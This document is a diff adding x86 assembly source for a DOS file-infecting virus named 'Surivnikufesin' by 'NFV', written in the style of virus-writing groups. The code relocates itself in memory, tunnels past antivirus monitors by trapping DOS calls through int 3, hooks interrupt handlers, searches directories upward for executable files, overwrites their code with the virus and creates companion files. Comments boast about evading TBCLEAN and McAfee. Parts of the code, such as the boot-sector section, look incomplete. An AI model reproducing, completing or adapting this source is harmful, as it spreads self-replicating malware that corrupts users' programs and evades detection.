@@ -1,0 +1,242 @@
+
+; [NFV] Surivnikufesin
+
+.model tiny
+.code
+.radix 16
+
+code_size = (ptbl-virus)
+werd      = word
+dwerd     = dword
+
+virus:  mov ax, 0d38c                   ; I really thought TBCLEAN was the
+adc ax, 7533                    ; be-all, end-all, whip-the-pants-
+jb $-5                          ; off-of-McAfee, AV program...this
+aam 0ff                         ; trick has worked for over a year
+mov al, ah
+cld                             ; forward moves
+mov ah, 1a
+mov dx, (bootsec-virus+100)
+int 21                          ; set new dta
+mov ah, 4a
+mov bx, 1000+(end_virus-virus)
+int 21                          ; resize .com memory block
+jc restore_host                 ; if not enough memory then exit
+mov ax, cs                      ; get code segment
+add ah, 10                      ; bump up 64k
+mov es, ax                      ; new virus segment
+mov si, 100                     ; code to copy
+sub di, di                      ; place to copy to
+mov cx, (ptbl-virus+1)/2        ; size of virus
+repz movsw                      ; zopy virus
+mov ax, offset high_code
+push es ax                      ; set a retf frame
+retf                            ; jump to other copy of virus
+restore_host:
+push cs cs                      ; restore segments
+pop ds es
+mov ah, 4a
+mov bx, -1
+int 21                          ; get available memory blocks
+;fix up bx
+mov ah, 4a
+int 21                          ; restore block to maximim memory
+mov ah, 1a
+mov dx, 80
+int 21                          ; restore old new dta
+high_code:
+mov si, cx                      ; reset si, di
+mov di, cx
+mov ah, 34
+int 21                          ; get indos flag
+mov dx, es                      ; save dos segment
+mov ah, 52
+int 21                          ; get dos variables address
+mov ax, es                      ; save dos segment
+mov werd ptr cs:[dosvars], bx   ; save dos variables list
+mov werd ptr cs:[dosvars+2], ax
+mov ax, dx                      ; compare segments to be sure
+jne restore_host
+neg ax
+add ax, es:[bx-2]               ; get size of dos segment
+xchg bx, ax
+mov ah, 48                      ; allocate memory the size of the
+int 21                          ; dos block
+jc restore_host                 ; if not enough then exit
+mov ds, dx                      ; dos segment
+mov es, ax                      ; allocated memory
+mov cl, 3
+shl bx, cl                      ; convert to werds
+mov cx, bx
+repz movsw                      ; zopy dos segment to allocated
+; memory
+mov cs:[tempseg], es            ; save allocated segment
+push ds
+pop es                          ; dos segment
+mov ds, cx                      ; ivt
+mov di, cx                      ; es:di -> pointer to dos segment
+mov cx, bx                      ; size of dos segment in werds
+mov ax, 0cccc
+cli                             ; don't allow ints to call dos
+repz stosw                      ; fill dos segment with int 3
+mov cs:[segsize], bx            ; save dos segment size
+mov cs:[dos_seg], es            ; save dos segment
+les bx, dwerd ptr ds:[3*4]      ; get int 3 address
+mov werd ptr cs:[save3], bx     ; save int 3 address
+mov werd ptr cs:[save3+2], es
+mov werd ptr ds:[3*4], offset int3      ; set new int 3
+mov ds:[3*4+2], cs
+mov ah, 52                      ; only dos should trap this call
+int 21                          ; tunnel dos
+error:                                  ; should never reach here
+int3:   pop ax bx                       ; get dos handler address
+mov werd ptr cs:[org21+2], bx   ; save dos segment
+dec ax                          ; adjust offset for int 3
+mov werd ptr cs:[org21], ax     ; save dos offset
+mov sp, 0fffc                   ; fix sp
+push cs
+pop ds
+sub si, si
+mov di, si
+mov es, ds:[dos_seg]             ; es:di -> pointer to dos segment
+mov cx, ds:[segsize]            ; size of dos segment in werds
+mov ds, ds:[tempseg]            ; ds:si -> pointer to dos code
+repz movsw                      ; restore dos segment
+sti                             ; allow ints again
+push ds                         ; save allocated segment
+mov ds, cx                      ; ivt
+les bp, dwerd ptr ds:[24*4]     ; get int 24 address
+mov werd ptr cs:[save24], bp    ; save int 24
+mov werd ptr cs:[save24+2], es
+mov ds:[3*4], ax                ; set new int 3
+mov ds:[3*4+2], bx
+pop es
+mov ah, 49
+int 3                           ; deallocate segment
+cli
+mov werd ptr ds:[24*4], offset int24    ; set new int 24
+mov ds:[24*4+2], cs
+sti
+push ds                         ; save ivt
+push cs cs
+pop ds es
+mov ah, 1a
+mov dx, offset newdta
+int 3                           ; set new dta
+find_first:
+mov ah, 4e
+mov cx, 3                       ; hidden, read-only
+mov dx, offset filename
+test ax, 0
+org $-2
+find_next:
+mov ah, 4f
+int 3                           ; find file
+jnc infect                      ; if no error then infect
+mov ah, 3bh
+mov dx, offset dirspec
+int 3                           ; transverse directory upward
+jnc find_first
+les bx, dwerd ptr ds:[save24]   ; get int 24 address
+pop ds                          ; get ivt
+cli
+mov ds:[24*4], bx               ; restore int 24
+mov ds:[24*4+2], es
+les bx, dwerd ptr cs:[save3]    ; get int 3 address
+mov ds:[3*4], bx                ; restore int 3
+mov ds:[3*4+2], es
+sti
+jmp restore_host
+infect: mov ax, 'OC'
+cmp ax, werd ptr ds:[newdta+1e] ; check for command.com
+je find_next
+xor ax, werd ptr ds:[newdta+26] ; see if .com file
+or ax, werd ptr ds:[newdta+1a]  ; and under 64k
+jnz find_next
+xchg cx, ax
+mov ax, 4301
+mov si, cx
+mov dx, offset dta+1e
+push ax dx
+int 3                           ; clear attributes
+mov ax, 3d02
+int 3                           ; open file
+xchg bx, ax
+mov ah, 3f
+mov cx, code_size               ; size to read
+mov dx, offset buffer           ; place to read to
+mov di, dx                      ; for compare
+int 3                           ; read in host
+mov cx, (save13-virus)          ; size to compare
+repz cmpsb                      ; check for infection
+pop si
+je close
+mov ax, 4200
+cwd
+int 3                           ; seek to beginning of file
+mov di, offset host
+mov cl, 4
+push di
+repz movsw
+mov ah, 40
+mov cx, code_size
+cwd
+int 3                           ; overwrite code
+mov ax, 4400
+int 3                           ; get file data
+or dl, 40                       ; don't set file time/date
+inc ax
+int 3                           ; set file data
+pop dx
+push bx cx                      ; save handle
+mov ah, 3c
+sub cx, cx                      ; no attribs
+int 3                           ; create companion
+xchg bx, ax
+mov ah, 40
+pop cx
+mov dx, offset buffer
+int 3                           ; write companion
+mov ah, 3e
+int 3                           ; close companion
+pop bx                          ; restore handle
+close:  mov ah, 3e
+int 3                           ; close host
+pop ax
+mov cl, byte ptr ds:[dta+15]
+sub ch, ch
+int 3                           ; restore attribs
+jmp find_next
+int24:  mov al, 3
+iret
+bootsec:
+sub di, di
+cli
+mov sp, 7c00                    ; set up a new stack
+mov ss, di
+sti
+push cs
+pop ds
+mov si, sp
+les bx, dwerd ptr ds:[13*4]     ; get int 13 vector
+;        mov werd ptr ds:[si+(save13-boot_sec)], bx      ; save i13 vector
+;        mov werd ptr ds:[si+(save13+2-boot_sec)], es
+
+save13:
+ptbl:
+filename        db '*.??m', 0
+dirspec db '..', 0
+host    db 8 dup (0), '.NFV', 0
+gheap:
+save3   dd ?
+save24  dd ?
+org21   dd ?
+dos_seg dw ?
+segsize dw ?
+tempseg dw ?
+dosvars dd ?
+newdta:
+buffer:
+dta:
+end_virus:
+end
